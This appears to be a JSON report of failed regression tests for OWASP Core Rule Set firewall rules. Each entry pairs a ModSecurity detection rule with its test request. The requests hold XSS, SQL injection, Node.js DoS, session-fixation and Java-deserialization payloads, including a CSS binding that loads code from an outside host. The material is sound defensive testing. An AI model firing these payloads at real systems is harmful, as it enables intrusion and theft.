    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* \"@rx (?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)\" \"id:934120,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  msg:'Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-ssrf',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-GENERIC',\\\n  tag:'capec/1000/225/664',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "934160",
    "test_id" : 4,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934160.yaml",
    "description" : "while falsy with negations",
    "cause" : "failed expect_id check: 934160 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920230 - Multiple URL Encoding Detected", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932236 - Remote Command Execution: Unix Command Injection (command without evasion)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "while falsy with negations",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?eval=while(!%2B0);",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934160 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_FILENAME|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* \"@rx while[\\s\\x0b]*\\([\\s\\x0b\\(]*(?:!+(?:false|null|undefined|NaN|[\\+\\-]?0|\\\"{2}|'{2}|`{2})|(?:!!)*(?:(?:t(?:rue|his)|[\\+\\-]?(?:Infinity|[1-9][0-9]*)|new [A-Za-z][0-9A-Z_a-z]*|window|String|(?:Boolea|Functio)n|Object|Array)\\b|\\{[^\\}]*\\}|\\[[^\\]]*\\]|\\\"[^\\\"]+\\\"|'[^']+'|`[^`]+`)).*\\)\" \"id:934160,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:urlDecodeUni,\\\n  t:jsDecode,\\\n  t:base64Decode,\\\n  t:urlDecodeUni,\\\n  t:jsDecode,\\\n  t:replaceComments,\\\n  msg:'Node.js DoS attack',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-javascript',\\\n  tag:'platform-nodejs',\\\n  tag:'attack-rce',\\\n  tag:'attack-injection-generic',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-GENERIC',\\\n  tag:'capec/1000/152/242',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  multiMatch,\\\n  setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "941110",
    "test_id" : 7,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941110.yaml",
    "description" : "XSS in payload with individual code points urlencoded",
    "cause" : "failed expect_id check: 941110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941390 - Javascript method detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "XSS in payload with individual code points urlencoded",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "POST",
          "port" : 80,
          "uri" : "/get",
          "headers" : {
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/x-www-form-urlencoded"
          },
          "data" : "var=%ef%bc%9cscript%20%ef%bc%9ealert%281%29%ef%bc%9c/script%ef%bc%9e\n",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941110 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|REQUEST_HEADERS:User-Agent|REQUEST_HEADERS:Referer|ARGS_NAMES|ARGS|XML:/* \"@rx (?i)<script[^>]*>[\\s\\S]*?\" \"id:941110,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:utf8toUnicode,\\\n  t:urlDecodeUni,\\\n  t:htmlEntityDecode,\\\n  t:jsDecode,\\\n  t:cssDecode,\\\n  t:removeNulls,\\\n  msg:'XSS Filter - Category 1: Script Tag Vector',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-xss',\\\n  tag:'xss-perf-disable',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-XSS',\\\n  tag:'capec/1000/152/242',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.xss_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "941110",
    "test_id" : 8,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941110.yaml",
    "description" : "XSS in cookie name using unicode",
    "cause" : "failed expect_id check: 941110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=941390 - Javascript method detected" ]
    },
    "test" : {
      "test_id" : 8,
      "desc" : "XSS in cookie name using unicode",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "uri" : "/get",
          "headers" : {
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "User-Agent" : "OWASP CRS test agent",
            "Cookie" : "script alert(1)/script=value"
          },
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941110 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|REQUEST_HEADERS:User-Agent|REQUEST_HEADERS:Referer|ARGS_NAMES|ARGS|XML:/* \"@rx (?i)<script[^>]*>[\\s\\S]*?\" \"id:941110,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:utf8toUnicode,\\\n  t:urlDecodeUni,\\\n  t:htmlEntityDecode,\\\n  t:jsDecode,\\\n  t:cssDecode,\\\n  t:removeNulls,\\\n  msg:'XSS Filter - Category 1: Script Tag Vector',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-xss',\\\n  tag:'xss-perf-disable',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-XSS',\\\n  tag:'capec/1000/152/242',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.xss_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "941180",
    "test_id" : 7,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941180.yaml",
    "description" : "We should not trigger on REQUEST_FILENAME without special characters",
    "cause" : "failed no_expect_ids check: 941180 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=941180 - Node-Validator Deny List Keywords" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "We should not trigger on REQUEST_FILENAME without special characters",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "uri" : "/get/javascript-manual/document.cookie",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 941180 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* \"@pm document.cookie document.domain document.querySelector document.body.appendChild document.write .parentnode .innerhtml window.location -moz-binding <!-- <![cdata[\" \"id:941180,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:utf8toUnicode,\\\n  t:urlDecodeUni,\\\n  t:htmlEntityDecode,\\\n  t:jsDecode,\\\n  t:cssDecode,\\\n  t:removeNulls,\\\n  msg:'Node-Validator Deny List Keywords',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-nodejs',\\\n  tag:'attack-xss',\\\n  tag:'xss-perf-disable',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-XSS',\\\n  tag:'capec/1000/152/242',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.xss_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "941190",
    "test_id" : 3,
    "test_path" : "REQUEST-941-APPLICATION-ATTACK-XSS/941190.yaml",
    "description" : "Node-validator deny list keywords, COOKIES_NAMES",
    "cause" : "failed expect_id check: 941190 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "Node-validator deny list keywords, COOKIES_NAMES",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "uri" : "/get/baz",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Cookie" : "<STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE>",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 941190 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* \"@rx (?i:<style.*?>.*?(?:@[i\\x5c]|(?:[:=]|&#x?0*(?:58|3A|61|3D);?).*?(?:[(\\x5c]|&#x?0*(?:40|28|92|5C);?)))\" \"id:941190,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:utf8toUnicode,\\\n  t:urlDecodeUni,\\\n  t:htmlEntityDecode,\\\n  t:jsDecode,\\\n  t:cssDecode,\\\n  t:removeNulls,\\\n  msg:'IE XSS Filters - Attack Detected',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-internet-explorer',\\\n  tag:'attack-xss',\\\n  tag:'xss-perf-disable',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-XSS',\\\n  tag:'capec/1000/152/242',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.xss_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "942440",
    "test_id" : 3,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942440.yaml",
    "description" : "SQL Comment Sequence",
    "cause" : "failed expect_id check: 942440 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942390 - SQL Injection Attack" ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "SQL Comment Sequence",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "version" : "HTTP/1.1",
          "uri" : "/post",
          "data" : "test=OR 1# "
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942440 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/_pk_ref/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* \"@rx /\\*!?|\\*/|[';]--|--(?:[\\s\\x0b]|[^\\-]*?-)|[^&\\-]#.*?[\\s\\x0b]|;?\\x00\" \"id:942440,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:urlDecodeUni,\\\n  msg:'SQL Comment Sequence Detected',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-sqli',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-SQLI',\\\n  tag:'capec/1000/152/248/66',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  chain\"", "SecRule MATCHED_VARS \"!@rx ^(?:ey[\\-0-9A-Z_a-z]+\\.ey[\\-0-9A-Z_a-z]+\\.)?[\\-0-9A-Z_a-z]+$\" \"t:none,\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.sql_injection_score=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "942440",
    "test_id" : 9,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942440.yaml",
    "description" : "SQL Comment Sequence",
    "cause" : "failed expect_id check: 942440 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942100 - SQL Injection Attack Detected via libinjection", "phase=2 rule_id=942130 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942330 - Detects classic SQL injection probings 1/3", "phase=2 rule_id=942390 - SQL Injection Attack", "phase=2 rule_id=942521 - Detects basic SQL authentication bypass attempts 4.1/4", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "SQL Comment Sequence",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "version" : "HTTP/1.1",
          "uri" : "/post",
          "data" : "test=' or 1=1# "
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942440 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/_pk_ref/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* \"@rx /\\*!?|\\*/|[';]--|--(?:[\\s\\x0b]|[^\\-]*?-)|[^&\\-]#.*?[\\s\\x0b]|;?\\x00\" \"id:942440,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:urlDecodeUni,\\\n  msg:'SQL Comment Sequence Detected',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-sqli',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-SQLI',\\\n  tag:'capec/1000/152/248/66',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  chain\"", "SecRule MATCHED_VARS \"!@rx ^(?:ey[\\-0-9A-Z_a-z]+\\.ey[\\-0-9A-Z_a-z]+\\.)?[\\-0-9A-Z_a-z]+$\" \"t:none,\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.sql_injection_score=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "942522",
    "test_id" : 7,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942522.yaml",
    "description" : "New line bypass",
    "cause" : "failed expect_id check: 942522 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942330 - Detects classic SQL injection probings 1/3", "phase=2 rule_id=942521 - Detects basic SQL authentication bypass attempts 4.1/4", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "New line bypass",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "var=newline%0A%5C' and 1",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942522 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule ARGS_NAMES|ARGS|XML:/* \"@rx ^.*?\\x5c['\\\"`](?:.*?['\\\"`])?\\s*(?:and|or)\\b\" \"id:942522,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:urlDecodeUni,\\\n  msg:'Detects basic SQL authentication bypass attempts 4.1/4',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-sqli',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-SQLI',\\\n  tag:'capec/1000/152/248/66',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.sql_injection_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "943110",
    "test_id" : 4,
    "test_path" : "REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION/943110.yaml",
    "description" : "Session Fixation Attack (943110) from old modsec regressions",
    "cause" : "failed no_expect_ids check: 943110 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=943110 - Possible Session Fixation Attack: SessionID Parameter Name with Off-Domain Referer" ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "Session Fixation Attack (943110) from old modsec regressions",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate",
            "Accept-Language" : "zh-sg",
            "Content-Type" : "application/x-www-form-urlencoded",
            "Host" : "localhost",
            "Referer" : "http://localhost/test",
            "Keep-Alive" : "300",
            "Proxy-Connection" : "keep-alive",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get/login.php?jsessionid=74B0CB414BD77D17B5680A6386EF1666",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 943110 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule ARGS_NAMES \"@rx ^(?:jsessionid|aspsessionid|asp\\.net_sessionid|phpsession|phpsessid|weblogicsession|session_id|session-id|sessionid|cfid|cftoken|cfsid|jservsession|jwsession|_flask_session|_session_id|connect\\.sid|laravel_session)$\" \"id:943110,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:lowercase,\\\n  msg:'Possible Session Fixation Attack: SessionID Parameter Name with Off-Domain Referer',\\\n  logdata:'Matched Data: %{TX.0} found within %{TX.943110_MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-fixation',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-SESSION-FIXATION',\\\n  tag:'capec/1000/225/21/593/61',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.943110_matched_var_name=%{matched_var_name}',\\\n  chain\"", "SecRule REQUEST_HEADERS:Referer \"@rx ^(?:ht|f)tps?://(.*?)/\" \"capture,\\\n  chain\"", "SecRule TX:1 \"!@endsWith %{request_headers.host}\" \"setvar:'tx.session_fixation_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "944200",
    "test_id" : 1,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944200.yaml",
    "description" : "Argument test includes java serialization magic bytes, base64 encoded request",
    "cause" : "failed expect_id check: 944200 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920451 - HTTP header is restricted by policy (host)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (user-agent)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept-encoding)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept-language)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept-charset)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (content-type)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (content-length)", "phase=1 rule_id=932237 - Remote Command Execution: Unix Shell Code Found in REQUEST_HEADERS", "phase=2 rule_id=920250 - UTF8 Encoding Abuse Attack Attempt", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Argument test includes java serialization magic bytes, base64 encoded request",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "encoded_request" : "UE9TVCAvIEhUVFAvMS4wDQpIb3N0OiBsb2NhbGhvc3QNClVzZXItQWdlbnQ6IE9XQVNQIE1vZFNlY3VyaXR5IENvcmUgUnVsZSBTZXQNCkFjY2VwdDogdGV4dC94bWwsYXBwbGljYXRpb24veG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCx0ZXh0L2h0bWw7cT0wLjksdGV4dC9wbGFpbjtxPTAuOCxpbWFnZS9wbmcsKi8qO3E9MC41DQpBY2NlcHQtQ2hhcnNldDogSVNPLTg4NTktMSx1dGYtODtxPTAuNywqO3E9MC43DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsZGVmbGF0ZQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi11cyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA5DQoNCnRlc3Q9rO0ABQ0KDQo="
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944200 ]
          }
        }
      } ]
    },
